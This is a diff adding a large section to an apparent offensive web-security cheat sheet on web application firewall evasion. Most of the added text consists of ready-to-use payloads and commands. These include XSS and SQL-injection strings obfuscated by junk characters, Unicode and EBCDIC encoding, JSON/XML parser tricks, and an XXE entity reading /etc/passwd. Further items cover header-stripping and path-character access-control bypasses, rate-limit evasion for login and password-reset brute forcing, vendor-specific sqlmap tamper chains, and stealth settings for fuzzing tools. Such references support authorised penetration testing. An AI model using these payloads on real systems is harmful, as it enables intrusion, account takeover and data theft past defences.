@@ -692,6 +692,353 @@ Got 403?
 └── 5 min total, still blocked → kill (5-minute rule)
 ```
 
+### Junk Character Injection (Disrupt Tokenizers)
+
+WAFs use tokenizers that split on operators/delimiters. Injecting garbage between tokens breaks the token stream while the backend parser ignores the noise:
+
+```
+<script>+-+-1-+-+alert(1)+-+-</script>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
+/?id=1+un/**/ion+sel/**/ect+1,2--
+```
+
+### Unicode Normalization (NFKD) XSS
+
+Backend normalizes full-width/Unicode chars to ASCII after WAF inspection:
+
+```html
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
+<!-- NFKD → <img src=p onerror='prompt(1)'> -->
+
+<marquee onstart=pr۰mpt()>
+<!-- ۰ = Persian digit zero = 'o' under some normalizers -->
+<!-- decoded: pr0mpt() — WAF misses because it's not "prompt" -->
+```
+
+Full-width Unicode characters (U+FF01–U+FF5E) map to ASCII after NFKD normalization. Persian/Arabic digits (۰–۹) can replace Latin digits. Test by sending these and checking if the server normalizes before execution.
+
+### IBM037 / EBCDIC Charset Bypass
+
+IIS decodes `charset=ibm037` (EBCDIC) in POST bodies. WAFs typically only handle UTF-8/ASCII and skip decoding:
+
+```http
+POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+
+# Body encoded in IBM EBCDIC — WAF cannot read it, IIS decodes it
+```
+
+```python
+# Python: encode payload in ibm037 for the request body
+import urllib.parse
+payload = "username=admin&password=test' OR '1'='1"
+encoded = payload.encode('ibm037')
+# Send encoded bytes in POST body
+```
+
+**Why it works:** The WAF only decodes the body as UTF-8. The payload is invisible to pattern matching. IIS (and some other Windows backends) decode IBM037 natively before passing to the application.
+
+### JSON/XML Parser Differential (WAFFLED 2025)
+
+**JSON — 557 unique bypass variants confirmed against Cloudflare/ModSecurity/GCP Cloud Armor:**
+
+```http
+# No Content-Type header — some WAFs skip inspection entirely
+POST /api/endpoint HTTP/1.1
+Host: target.com
+# (omit Content-Type)
+
+{"username": "admin' OR '1'='1"}
+
+# Null byte between field name and colon — WAF JSON parser breaks
+{"field1"\x00: "payload"}
+
+# Quote replacement (null byte substituted for double quote)
+{\x00field1\x00: "value"}
+```
+
+**XML — 299 unique bypass variants:**
+
+```xml
+<!-- Extra chars at DOCTYPE closure — confuses WAF's parser -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]X>
+<foo>&xxe;</foo>
+
+<!-- UTF-16 encode the entire XML payload -->
+<!-- iconv -f utf-8 -t utf-16 payload.xml > payload_utf16.xml -->
+<!-- Header: Content-Type: text/xml; charset=utf-16 -->
+<!-- WAF sees garbage bytes; XML parser decodes charset correctly -->
+```
+
+### Hop-by-Hop Header Stripping
+
+List headers in `Connection:` to force intermediate proxies to strip them. If the WAF reads these headers for access decisions BEFORE the proxy strips them, the bypass is achieved:
+
+```http
+GET /admin HTTP/1.1
+Host: target.com
+Connection: X-Forwarded-For, Keep-Alive
+X-Forwarded-For: legitimate-IP
+```
+
+The proxy removes `X-Forwarded-For` before the request reaches the backend. Backend sees no XFF → defaults to allowing. WAF already blocked based on real IP, but now the backend has no IP to check.
+
+**Standard hop-by-hop headers (strippable by listing in Connection:):**
+```
+Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization,
+TE, Trailer, Transfer-Encoding
+
+Non-standard but often strippable:
+Authorization, Cookie, X-Forwarded-For, X-Real-IP
+```
+
+**Attack scenario:** WAF allows only trusted IPs via X-Forwarded-For. Forge XFF header + list it in Connection: → proxy strips it → backend trusts the request.
+
+### NGINX / Backend-Specific Path Bypass Characters
+
+Characters that NGINX passes through but the backend treats as a path terminator/separator, causing access control mismatches:
+
+| Backend | NGINX Version | Bypass Chars | Example |
+|---|---|---|---|
+| Node.js/Express | 1.22.0+ | `\xA0` (NBSP) | `/admin\xA0` |
+| Node.js/Express | 1.16.1–1.20.2 | `\xA0`, `\x09`, `\x0C` | `/admin\x09` |
+| Flask/Python | 1.22.0+ | `\x85`, `\xA0` | `/admin\x85` |
+| Flask/Python | 1.16.1–1.20.2 | `\x85`,`\xA0`,`\x1F`,`\x1E`,`\x1D`,`\x1C`,`\x0C`,`\x0B` | `/admin\x0B` |
+| Spring Boot | all | `;` (NGINX 1.20.2+), `\x09` | `/admin;` |
+| PHP-FPM | any | `/index.php` path info | `/admin.php/index.php` |
+
+```bash
+# Node.js backend — NBSP bypass
+curl $'https://target.com/admin\xA0'
+
+# Spring Boot — semicolon separator
+curl 'https://target.com/admin;'
+
+# PHP-FPM — path info bypass
+curl 'https://target.com/admin.php/index.php'
+```
+
+**ModSecurity path confusion:**
+```
+/foo%3f';alert(1);foo=         # %3f = ?, confuses path parser
+/backup%2ebak                  # bypasses .bak extension block rule
+```
+
+**Spring Boot suffix pattern match (< v5.3):**
+```
+/admin.anything               # matches /admin route (useSuffixPatternMatch=true)
+/admin.json
+/admin.html
+```
+
+### Rate Limit Bypass — Endpoint Variation
+
+Counters are often keyed on exact URL. Small variations reset the counter:
+
+```
+/api/v1/login
+/api/v2/login          # different version → different counter key
+/api/v1/Login          # case variation
+/api/v1/login/         # trailing slash
+/api/v1/login%20       # URL-encoded space (decoded by backend, not by counter)
+/api/v1/login?x=1     # added dummy parameter
+/api/v1/login#anchor   # fragment (ignored by server, resets counter)
+```
+
+**Null byte / character variation for email-based counters:**
+```
+/reset-password?email=victim@test.com%00
+/reset-password?email=victim@test.com%0d
+/reset-password?email=victim%2b1@test.com    # Gmail ignores +alias
+/reset-password?email=victim+abc@test.com    # Different string, same inbox
+```
+
+### Rate Limit Bypass — Protocol-Level Techniques
+
+```bash
+# HTTP/2 multiplexing — send 100+ requests in ONE TCP connection
+# WAF/rate limiter counts per connection, not per stream
+# Use Turbo Intruder in Burp (race conditions tab)
+curl --http2-prior-knowledge -d @requests.txt https://target.com/api/otp
+
+# WebSocket upgrade — after upgrade, each message bypasses per-HTTP-request counters
+# Connect once, then flood WS messages through the single persistent connection
+
+# GraphQL aliasing — one HTTP request = N mutation attempts
+{
+  attempt1: login(username: "admin", password: "pass1") { token }
+  attempt2: login(username: "admin", password: "pass2") { token }
+  attempt3: login(username: "admin", password: "pass3") { token }
+  # ... up to 100+ aliases in one request
+}
+
+# gRPC bidirectional streaming — messages are not individual HTTP requests
+# Rate limiter on HTTP layer doesn't see individual gRPC frames
+```
+
+**Timing exploitation:**
+```
+Window reset attack: burst requests timed to arrive just after rate-limit window resets
+  → effectively doubles throughput (burst before reset + burst after)
+
+Slow HTTP: space requests just under detection threshold
+  → ffuf -rate 1 -p 5   (1 req/s, 5s pause)
+```
+
+### SQLmap Tamper Scripts Reference
+
+```bash
+# Single tamper
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
+
+# Multiple tampers (applied in order left to right)
+sqlmap -u "https://target.com/page?id=1" \
+  --tamper=between,bluecoat,charencode,randomcase,space2comment \
+  --random-agent --delay=2 --level=5 --risk=3
+```
+
+**Complete tamper reference:**
+
+| Script | What It Does | Best For |
+|---|---|---|
+| `apostrophemask` | `'` → UTF-8 full-width `＇` | All |
+| `apostrophenullencode` | `'` → `%00%27` | All |
+| `base64encode` | Base64-encode entire payload | All |
+| `between` | `>` → `NOT BETWEEN 0 AND` | MSSQL/MySQL/Oracle/PG |
+| `bluecoat` | space → `%09` (tab) | MySQL, BlueCoat SGOS |
+| `chardoubleencode` | double URL-encode all chars | All |
+| `charencode` | URL-encode all chars | All |
+| `charunicodeencode` | `%uXXXX` encoding | MSSQL/MySQL/ASP.NET |
+| `commalesslimit` | `LIMIT 2,3` → `LIMIT 3 OFFSET 2` | MySQL |
+| `equaltolike` | `=` → `LIKE` | MSSQL/MySQL |
+| `greatest` | `>` → `GREATEST()` | MySQL/Oracle/PG |
+| `halfversionedmorekeywords` | space → `/*!0` | MySQL |
+| `lowercase` | all keywords lowercase | All |
+| `modsecurityversioned` | `AND` → `/*!12345AND*/` | MySQL + ModSecurity |
+| `modsecurityzeroversioned` | `AND` → `/*!0AND*/` | MySQL + ModSecurity |
+| `multiplespaces` | single space → multiple spaces | All |
+| `nonrecursivereplacement` | `union` → `uniunionon` | All |
+| `overlongutf8` | overlong UTF-8 encoding | All |
+| `percentage` | `select` → `s%e%l%e%c%t` | MSSQL |
+| `randomcase` | `INSERT` → `INseRt` | All |
+| `randomcomments` | insert `/**/` randomly | MySQL |
+| `securesphere` | append `and '0having'='0having'` | All |
+| `space2comment` | space → `/**/` | All |
+| `space2dash` | space → `--\n` | MSSQL/SQLite |
+| `space2hash` | space → `%23\n` | MySQL |
+| `space2mssqlblank` | space → random MSSQL blanks | MSSQL |
+| `space2mysqlblank` | space → random MySQL blanks | MySQL |
+| `space2plus` | space → `+` | All |
+| `space2randomblank` | space → random `%09/%0A/%0C/%0D` | All |
+| `symboliclogical` | `AND` → `%26%26`, `OR` → `\|\|` | All |
+| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | All |
+| `unmagicquotes` | `'` → `%bf%27` (GBK multi-byte) | MySQL (magic_quotes) |
+| `uppercase` | all keywords uppercase | All |
+| `versionedkeywords` | `union` → `/*!union*/` | MySQL |
+| `xforwardedfor` | add random `X-Forwarded-For` header | All |
+
+**Pre-built combinations by WAF vendor:**
+
+```bash
+# ModSecurity (OWASP CRS)
+--tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,randomcase
+
+# Cloudflare (2025)
+--tamper=space2comment,randomcase,charencode,between
+
+# AWS WAF
+--tamper=between,charencode,chardoubleencode
+
+# Imperva
+--tamper=randomcase,space2comment,equaltolike
+
+# MySQL WAFs (general)
+--tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,
+         halfversionedmorekeywords,versionedkeywords,versionedmorekeywords
+
+# MSSQL WAFs (general)
+--tamper=between,charencode,charunicodeencode,equaltolike,space2comment,
+         space2dash,space2mssqlblank
+
+# Unknown WAF (throw everything)
+--tamper=apostrophemask,base64encode,between,chardoubleencode,charencode,
+         equaltolike,greatest,multiplespaces,nonrecursivereplacement,
+         percentage,randomcase,space2comment,space2plus,unionalltounion,unmagicquotes
+```
+
+### Tool-Specific WAF Evasion Options
+
+**ffuf:**
+```bash
+# Rate control to avoid triggering rate-limit WAF rules
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -rate 50          \   # max 50 req/s
+  -p 0.1-0.5        \   # random delay 100-500ms per request
+  -t 10                 # threads (lower = stealthier)
+
+# Header rotation for WAF bypass
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
+  -H "Referer: https://target.com/"
+
+# Filter out WAF block responses by size/words
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -fc 403,429       \   # filter 403 and 429 status codes
+  -fw 97            \   # filter responses with 97 words (WAF block page)
+  -fs 512               # filter 512-byte responses (WAF block page size)
+
+# 403 bypass: fuzz the X-Forwarded-For header with IP list
+ffuf -u https://target.com/admin -w ips.txt \
+  -H "X-Forwarded-For: FUZZ" -mc 200
+```
+
+**wfuzz:**
+```bash
+wfuzz -z file,wordlist.txt \
+  --hc 403,429 \
+  -t 5 \                 # 5 threads (lower = less noisy)
+  -s 0.5 \               # 0.5s delay between requests
+  -H "X-Forwarded-For: 127.0.0.1" \
+  https://target.com/FUZZ
+
+# Multiple header injection for 403 bypass
+wfuzz -z file,headers.txt -H "FUZZ" --hc 403 https://target.com/admin
+```
+
+**nuclei:**
+```bash
+# Rate limit WAF evasion
+nuclei -u https://target.com \
+  -rate-limit 10 \         # 10 req/s max
+  -bulk-size 5 \           # 5 hosts per template batch
+  -c 5 \                   # 5 concurrent templates
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "User-Agent: Mozilla/5.0"
+
+# WAF detection first
+nuclei -u https://target.com -t http/technologies/waf-detect.yaml
+
+# Custom headers on all requests
+nuclei -u https://target.com \
+  -H "Referer: https://target.com/" \
+  -H "X-Forwarded-For: 127.0.0.1"
+```
+
+### Burp Suite Extensions for WAF Bypass
+
+| Extension | Function | Source |
+|---|---|---|
+| **nowafpls** | Insert junk at cursor (JSON/XML/URL/multipart/GraphQL) to push past WAF inspection limit | assetnote/nowafpls |
+| **nowafplsV2** | Auto-inject junk for Active Scanner / DAST runs | irwankusuma/nowafplsV2 |
+| **WAF Bypadd** | Pad requests with dummy data to exceed WAF inspection ceiling | PortSwigger/waf-bypadd |
+| **HTTP Smuggler** | CL.TE / TE.CL / TE.TE desync testing | nccgroup/BurpSuiteHTTPSmuggler |
+| **Hackvertor** | In-request encoding transforms (nest URL+HTML+unicode+base64) | PortSwigger BApp Store |
+| **Param Miner** | Discover hidden/undocumented parameters | PortSwigger BApp Store |
+| **IP Rotate** | Rotate source IP via AWS API Gateway | PortSwigger BApp Store |
+| **Chunked Coding Converter** | Transform requests to chunked Transfer-Encoding | BApp Store / c0ny1 |
+| **SAMLRaider** | XSW, signature stripping, XXE in SAML assertions | BApp Store |
+
 ---
 
 ## WEBSOCKET PAYLOADS
